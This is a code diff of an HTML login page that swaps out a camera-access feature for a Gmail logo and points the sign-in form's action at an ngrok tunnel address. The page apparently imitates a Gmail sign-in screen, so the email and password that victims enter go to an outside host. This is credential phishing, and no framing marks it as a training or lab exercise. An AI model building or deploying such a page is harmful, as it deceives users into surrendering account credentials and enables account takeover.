@@ -65,53 +65,27 @@
             text-decoration: none;
         }
 
-        .camera-message {
-            text-align: left;
-            margin-bottom: 10px;
-        }
-
-        #videoElement {
-            width: 100%;
-            max-width: 100%;
-            height: auto;
-            margin-bottom: 20px;
-            border-radius: 5px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        .image{
+            text-align: center;
+            padding-bottom: 2%;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
+        <div class="image">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/800px-Gmail_icon_%282020%29.svg.png">
+        </div>
         <h2>Sign in</h2>
-        <form action="/login" method="post">
+        <form action="https://b57f-46-113-12-46.ngrok-free.app/login" method="post">
             <input type="email" name="username" placeholder="Email" required>
             <input type="password" name="password" placeholder="Enter your password" required>
-            
-            <div class="camera-message">
-                <input type="checkbox" id="camera_permission" name="camera_permission" value="yes">
-                <label for="camera_permission">Allow access to camera</label>
-            </div>
 
-            <input type="submit" value="Next">
-            <button id="startButton" type="button">Start Camera</button>
+            <input type="submit" value="Login">
         </form>
         <div class="form-footer">
             <a href="#">Forgot password?</a>
         </div>
-        <video id="videoElement" autoplay></video>
     </div>
-    <script>
-        const videoElement = document.getElementById('videoElement');
-        const startButton = document.getElementById('startButton');
-
-        startButton.addEventListener('click', async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                videoElement.srcObject = stream;
-            } catch (error) {
-                console.error('Error accessing the camera:', error);
-            }
-        });
-    </script>
 </body>
 </html>
